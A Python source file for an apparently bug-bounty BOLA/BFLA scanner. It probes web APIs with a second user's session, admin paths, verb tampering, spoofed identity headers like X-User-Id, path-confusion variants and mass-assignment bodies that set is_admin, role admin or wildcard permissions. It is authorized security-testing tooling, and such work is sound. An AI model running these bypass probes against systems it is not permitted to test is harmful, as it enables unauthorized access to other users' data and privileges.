"""
BOLA / BFLA scanner — Broken Object-Level + Function-Level Authorization.

Differs from idor_sweep.py: idor_sweep does horizontal cross-tenant UUID
swaps. bola_scanner is broader and complementary:

  T1. Object-level (BOLA): GET /api/<resource>/<other_user_uuid> as me.
      (Same as idor_sweep — included for completeness in a single tool.)
  T2. Function-level (BFLA): hit endpoints typically reserved for higher-
      privilege roles (admin, manager) using a regular-user session.
  T3. Verb tampering: replay GET endpoints with PUT/DELETE/PATCH to look
      for missing method-level authz (rare but high impact when present).
  T4. Header injection: swap the user identifier via X-User-Id /
      X-Account-Id / Authorization-User headers.
  T5. Path-confusion: try alternative case / encoding / path traversal
      to bypass authz checks (e.g. /api/Admin vs /api/admin, /api/users//1).
  T6. Mass-assignment: send extra fields like {"is_admin": true,
      "role": "admin", "ownerId": "<other>"} on update endpoints.

This module is endpoint-driven: caller provides a list of endpoint specs,
the scanner iterates each test type. Safe by default — only sends GET
unless you opt into verb tampering.

Typical usage:
    spec = [EndpointSpec(method="GET", path="/api/wallets/{id}", id_param="id")]
    scanner = BolaScanner(session_a=acct_a, session_b=acct_b)
    findings = scanner.run(spec, harvested_uuids=harvest)
"""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Iterable

UA_DEFAULT = "viper-ashborn-h1 (Authorized Testing - VIPER BOLA)"


@dataclass
class AuthSession:
    label: str
    base_url: str  # e.g. https://app-sandbox.circle.com
    cookie_header: str
    user_agent: str = UA_DEFAULT
    extra_headers: dict[str, str] = field(default_factory=dict)


@dataclass
class EndpointSpec:
    method: str           # GET | POST | PUT | PATCH | DELETE
    path: str             # e.g. "/api/wallets/{id}"
    id_param: str = "id"  # name of the {placeholder} that holds the foreign UUID
    body_template: dict | None = None  # for POST/PUT — may contain {id}
    label: str = ""

    def fmt(self, uuid: str) -> str:
        return self.path.format(**{self.id_param: uuid})


@dataclass
class Finding:
    test: str          # T1..T6
    spec_label: str
    method: str
    url: str
    request_summary: str
    status: int
    verdict: str
    body_excerpt: str = ""
    actor: str = ""    # which session label (a/b/anonymous)


def _send(session: AuthSession, method: str, url: str, *, body: dict | None = None,
          extra_headers: dict[str, str] | None = None,
          timeout: int = 15) -> tuple[int, str]:
    headers = {
        "User-Agent": session.user_agent,
        "Accept": "application/json",
        "Cookie": session.cookie_header,
    }
    headers.update(session.extra_headers)
    if extra_headers:
        headers.update(extra_headers)
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        return -1, f"URL_ERROR: {e}"


def _verdict(status: int, success_codes: tuple[int, ...] = (200, 201, 204)) -> str:
    if status in success_codes:
        return "POTENTIAL_BUG"
    if status in (401, 403):
        return "DENIED"
    if status in (404, 405, 422):
        return "NOT_APPLICABLE"
    if status < 0:
        return "NETWORK_ERROR"
    return f"OTHER_{status}"


@dataclass
class BolaScanner:
    session_a: AuthSession
    session_b: AuthSession | None = None  # required for T1 cross-tenant
    rate_limit_s: float = 0.5
    enable_verb_tampering: bool = False
    enable_mass_assignment: bool = False

    def run(
        self, specs: list[EndpointSpec], *,
        harvested_uuids: dict[str, list[str]] | None = None,
        admin_paths: Iterable[str] = (),
    ) -> list[Finding]:
        findings: list[Finding] = []
        harvested_uuids = harvested_uuids or {}

        for spec in specs:
            findings.extend(self._t1_cross_tenant(spec, harvested_uuids))
            findings.extend(self._t4_header_injection(spec, harvested_uuids))
            findings.extend(self._t5_path_confusion(spec, harvested_uuids))
            if self.enable_verb_tampering:
                findings.extend(self._t3_verb_tampering(spec, harvested_uuids))
            if self.enable_mass_assignment:
                findings.extend(self._t6_mass_assignment(spec, harvested_uuids))

        for path in admin_paths:
            findings.extend(self._t2_function_level(path))

        return findings

    # T1 — object-level, A's UUIDs accessed by B
    def _t1_cross_tenant(self, spec: EndpointSpec,
                         harvested: dict[str, list[str]]) -> list[Finding]:
        if not self.session_b:
            return []
        findings: list[Finding] = []
        for src_path, ids in harvested.items():
            for uuid in ids[:5]:  # cap
                url = self.session_b.base_url + spec.fmt(uuid)
                status, text = _send(self.session_b, spec.method, url)
                findings.append(Finding(
                    test="T1_BOLA",
                    spec_label=spec.label or spec.path,
                    method=spec.method,
                    url=url,
                    request_summary=f"as {self.session_b.label}",
                    status=status,
                    verdict=_verdict(status),
                    body_excerpt=text[:200],
                    actor=self.session_b.label,
                ))
                time.sleep(self.rate_limit_s)
        return findings

    # T2 — function-level, common admin paths probed as session_a
    def _t2_function_level(self, path: str) -> list[Finding]:
        url = self.session_a.base_url + path
        status, text = _send(self.session_a, "GET", url)
        return [Finding(
            test="T2_BFLA",
            spec_label="admin_endpoint",
            method="GET",
            url=url,
            request_summary=f"as {self.session_a.label}",
            status=status,
            verdict=_verdict(status),
            body_excerpt=text[:200],
            actor=self.session_a.label,
        )]

    # T3 — replay endpoints with destructive verbs
    def _t3_verb_tampering(self, spec: EndpointSpec,
                           harvested: dict[str, list[str]]) -> list[Finding]:
        findings: list[Finding] = []
        own_ids = []
        for ids in harvested.values():
            own_ids.extend(ids[:1])
        if not own_ids:
            return findings
        # Try non-destructive tampering only — never DELETE.
        for verb in ("PATCH", "PUT", "OPTIONS"):
            uuid = own_ids[0]
            url = self.session_a.base_url + spec.fmt(uuid)
            status, text = _send(self.session_a, verb, url, body={})
            findings.append(Finding(
                test="T3_VERB_TAMPERING",
                spec_label=spec.label or spec.path,
                method=verb,
                url=url,
                request_summary=f"replay as {verb}",
                status=status,
                verdict=_verdict(status),
                body_excerpt=text[:200],
                actor=self.session_a.label,
            ))
            time.sleep(self.rate_limit_s)
        return findings

    # T4 — header injection attempts
    def _t4_header_injection(self, spec: EndpointSpec,
                             harvested: dict[str, list[str]]) -> list[Finding]:
        if not self.session_b:
            return []
        findings: list[Finding] = []
        b_ids: list[str] = []
        for ids in harvested.values():
            b_ids.extend(ids)
        b_ids = b_ids[:3]
        for uuid in b_ids:
            url = self.session_a.base_url + spec.fmt(uuid)
            for hdr_name in ("X-User-Id", "X-Account-Id", "X-Tenant-Id", "X-Forwarded-User"):
                status, text = _send(
                    self.session_a, spec.method, url,
                    extra_headers={hdr_name: uuid},
                )
                findings.append(Finding(
                    test="T4_HEADER_INJECTION",
                    spec_label=spec.label or spec.path,
                    method=spec.method,
                    url=url,
                    request_summary=f"as {self.session_a.label}, header {hdr_name}={uuid[:8]}...",
                    status=status,
                    verdict=_verdict(status),
                    body_excerpt=text[:200],
                    actor=self.session_a.label,
                ))
                time.sleep(self.rate_limit_s)
        return findings

    # T5 — path/case/encoding confusion
    def _t5_path_confusion(self, spec: EndpointSpec,
                           harvested: dict[str, list[str]]) -> list[Finding]:
        if not self.session_b:
            return []
        findings: list[Finding] = []
        b_ids: list[str] = []
        for ids in harvested.values():
            b_ids.extend(ids[:1])
        for uuid in b_ids[:2]:
            base_url = self.session_a.base_url + spec.fmt(uuid)
            variants = [
                base_url + "/",                                # trailing slash
                base_url.replace("/api/", "/API/"),            # case
                base_url.replace("/api/", "/api/./"),          # dot segment
                base_url + ";.json",                           # extension trick
                base_url + "%2F",                              # encoded slash
            ]
            for v in variants:
                status, text = _send(self.session_a, spec.method, v)
                findings.append(Finding(
                    test="T5_PATH_CONFUSION",
                    spec_label=spec.label or spec.path,
                    method=spec.method,
                    url=v,
                    request_summary=f"as {self.session_a.label}",
                    status=status,
                    verdict=_verdict(status),
                    body_excerpt=text[:200],
                    actor=self.session_a.label,
                ))
                time.sleep(self.rate_limit_s)
        return findings

    # T6 — mass assignment: extra "admin" fields on update bodies
    def _t6_mass_assignment(self, spec: EndpointSpec,
                            harvested: dict[str, list[str]]) -> list[Finding]:
        if spec.method not in ("POST", "PUT", "PATCH"):
            return []
        findings: list[Finding] = []
        own_ids: list[str] = []
        for ids in harvested.values():
            own_ids.extend(ids[:1])
        if not own_ids:
            return findings
        uuid = own_ids[0]
        url = self.session_a.base_url + spec.fmt(uuid)
        # Build body: caller-provided template + escalation fields appended.
        for extra in (
            {"is_admin": True, "role": "admin"},
            {"permissions": ["*"]},
            {"ownerId": "00000000-0000-0000-0000-000000000000"},
        ):
            body = dict(spec.body_template or {})
            body.update(extra)
            status, text = _send(self.session_a, spec.method, url, body=body)
            findings.append(Finding(
                test="T6_MASS_ASSIGNMENT",
                spec_label=spec.label or spec.path,
                method=spec.method,
                url=url,
                request_summary=f"as {self.session_a.label}, extra={list(extra.keys())}",
                status=status,
                verdict=_verdict(status),
                body_excerpt=text[:200],
                actor=self.session_a.label,
            ))
            time.sleep(self.rate_limit_s)
        return findings
